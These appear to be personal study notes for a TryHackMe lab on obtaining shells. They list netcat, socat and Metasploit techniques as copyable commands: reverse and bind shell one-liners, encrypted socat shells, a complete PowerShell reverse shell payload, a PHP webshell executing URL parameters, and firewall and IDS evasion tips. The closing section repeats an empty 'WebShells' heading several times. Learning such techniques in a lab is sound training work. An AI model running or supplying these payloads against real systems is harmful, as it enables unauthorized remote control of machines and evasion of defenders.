https://tryhackme.com/room/introtoshells

### Table of contents
- [[#Tools]]
- [[#Shell Types]]
- [[#Netcat]]
- [[#Netcat Shell Stabilization]]
- [[#Socat]]
- [[#Socat Encrypted Shells]]
- [[#Common Shell Payloads]]
- [[#`msfvenom`]]
- [[#`multi/handler`]]
- [[#WebShells]]
- 
 
___
### Tools
[[#Table of contents|Back to the top]]

**Netcat**
Swiss Army Knife of networking, receive reverse shells, connect to remote ports attached to bind shells on target, unstable but improvable shells

**Socat**
Netcat on steroids, more stable shells, but more difficult syntax, not installed by default

**Metasploit -- multi/handler**
`exploit/multi/handler` module to receive reverse shells, interact with meterpreter shell, best for staged payloads

**Msfvenom**
Part of metasploit, like multi/handler, generates payloads

Online resources
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
- https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
- https://github.com/danielmiessler/SecLists

___
### Shell Types
[[#Table of contents|Back to the top]]

- **Reverse Shell:** target executes code to connect back to attacker, listener on attacker machine, good to bypass firewalls
- **Bind Shell:** code executes on target to start listener attached to shell on target

- **Interactive:** can interact with program after running it (Bash, Powershell, ...)
- **Non-interactive:** run only programs that don't require user interaction in order to run properly

___
### Netcat
[[#Table of contents|Back to the top]]

**Reverse Shell**
1. `nc -lvnp <port-number>`: set up listener on attacker machine
   Options: **-l**istening, **-v**erbose, **-n**o DNS resolution, **-p**ort specification (--> use well-know port number in order to get past firewall and detection)
2. Execute **payload** on target machine to connect back to listener

**Bind Shell**
1. Set up listener on target machine
2. `nc <target-ip> <chosen-port>`: connect attacker machine to listener

___
### Netcat Shell Stabilization
[[#Table of contents|Back to the top]]

**Python (Linux)**
1. `python -c 'import pty;pty.spawn("/bin/bash")'` (or `python2/3`): import better shell
2. `export TERM=xterm`: gives access to *term commands* (e.g. `clear`)
3. Background shell with `CTRL + Z`, in terminal `stty raw -echo; fg`
	   $\rightarrow$ kill own terminal echo (--> give access to tab autocomplete, arrow keys, CTRL + C to kill process and not shell)
	   $\rightarrow$ foreground shell
`reset`: restore echo in own terminal

**`rlwrap`**
Gives access to history, tab autocompletion, arrow keys immediately upon receiving shell
`sudo apt install rlwrap`
`rlwrap nc -lvnp <port>`: prepend netcat listener to obtain more fully featured shell, especially useful on Windows targets

**Socat (Linux)**
Netcat shell stepping stone to obtain socat shell
1.  Download [socat static compiled binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true)
2. `sudo python3 -m http.server 80`: start web server on attacking machine
3. `wget <LOCAL-IP>/socat -O /tmp/socat`: download binary on target machine
   `Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe`

Adjust TTY (Teletypewriters) size
1. `stty -a` (in other terminal): display TTY information --> note down values for rows and columns
2. `stty rows <number>`and `<cols>` (in shell)

___
### Socat
[[#Table of contents|Back to the top]]

*Connector between 2 points*
- Listening port and keyboard
- Listening port and file
- 2 listening ports

**Reverse Shells**
1. Listener: `socat TCP-L:<port> -`
2. Connect back
	- Linux: `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"`
	- Windows: `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes` ("pipes": force powershell to use Unix style input/output)

**Bind Shells**
1. Listener
	- Linux: `socat TCP-L:<PORT> EXEC:"bash -li"`
	- Windows: `socat TCP-L:<PORT> EXEC:powershell.exe,pipes`
2. Connect to listener: `socat TCP:<TARGET-IP>:<TARGET-PORT> -`

**More Stable Fully Interactive Reverse Shell on Linux**
Target must have Socat installed --> upload [precompiled socat binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true)
1. Listener: `socat TCP-L:<port> FILE:'tty',raw,echo=0`
*Connect listening port and file, passing TTY in file and setting echo to 0 (similar to netcat `stty raw -echo; fg` trick*
2. `socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane`: connect to listener
	- `EXEC:"bash -li"`: create interactive bash session
	- `pty`: allocates pseudoterminal on target -- part of stabilisation process
	- `stderr`: makes sure any error messages get shown in shell  
	- `sigint`: passes any CTRL + C commands through into sub-process, allowing to kill commands inside shell
	- `setsid`: creates process in new session
	- `sane`: stabilises terminal, attempting to "normalise" it

___
### Socat Encrypted Shells
[[#Table of contents|Back to the top]]

*Can't be spied on, can often bypass IDS*

`TCP` is replaced with `openssl` when working with encrypted shells

**Reverse Shell**

1. Create **certificate** on attacking machine
`openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`
*Info about the certificate can be left blank / filled randomly*

2. **Merge** key and certificate into .pem file
`cat shell.key shell.crt > shell.pem`

3. Reverse shell listener
`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -`
*`verify=0`: no verification of certificate authorities*

4. Connect back
`socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash`

**Bind Shell**
Same 1. and 2. 
3. Listener on target
`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`
4. Connect
`socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -`

___
### Common Shell Payloads
[[#Table of contents|Back to the top]]

Option `-e` to execute process on connection

**Bind Shell**
Connect to listener with `nc -lvnp <port_number> -e /bin/bash` --> *executes bind shell on target*

**Reverse Shell**
Connect back to listener with `nc <LOCAL-IP> <PORT> -e /bin/bash` --> *executes reverse shell on target*

Works perfectly on windows, might not on Linux

--> Linux bind shell listener payload: `mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`
--> Linux reverse shell listener payload: `mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`

--> Powershell reverse shell payload:
`powershell -c "$client = New-Object System.Net.Sockets.TCPClient('**<ip>**',**<port>**);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`

[More resources](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

___
### `msfvenom`
[[#Table of contents|Back to the top]]

Payload generator, part of Metasploit

Syntax: `msfvenom -p <PAYLOAD> <OPTIONS>`

- **Staged:** sent in 2 parts
	$\rightarrow$ Stager executes on server, connects back to listener, uses connection to load real payload, prevents actual payload from touching disk where it could be detected by antivirus
- **Stageless:** entirely self-contained

**Payload naming convention:** `<OS>/<arch>/<payload>`
*Example:* `linux/x86/shell_reverse_tcp`
Exception: Windows 32 --> arch unspecified: `windows/<payload>`

Stageless: `shell_reverse_tcp`
Staged: `shell/reverse_tcp`

`msfvenom --list payloads` + `grep` to find payload

___
### `multi/handler`
[[#Table of contents|Back to the top]]

Reverse shell catching tool

1. `msfconsole`: start metasploit console
2. `use multi/handler`: start multi/handler
3. `options`: display available options --> payload, LHOST and LPORT
4. Set options
	- `set PAYLOAD <payload>`
	- `set LHOST <listen-address>`
	- `set LPORT <listen-port>`
5. `exploit -j`: start module (listener) as job in background

To foreground: `sessions`, `sessions <session_number>`

___
### WebShells
[[#Table of contents|Back to the top]]

*Script that runs on webserver (in PHP or ASP for instance), executes code on server*
*Commands are entered on webpage (HTML form / directly into URL), then executed by script, results written on page*

`<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>`
*gets parameter called "cmd" and executes it with shell_exec(), "pre" ensures correct formating of output*



___
### WebShells
[[#Table of contents|Back to the top]]



___
### WebShells
[[#Table of contents|Back to the top]]



___
### WebShells
[[#Table of contents|Back to the top]]



___
### WebShells
[[#Table of contents|Back to the top]]



___
### WebShells
[[#Table of contents|Back to the top]]



___
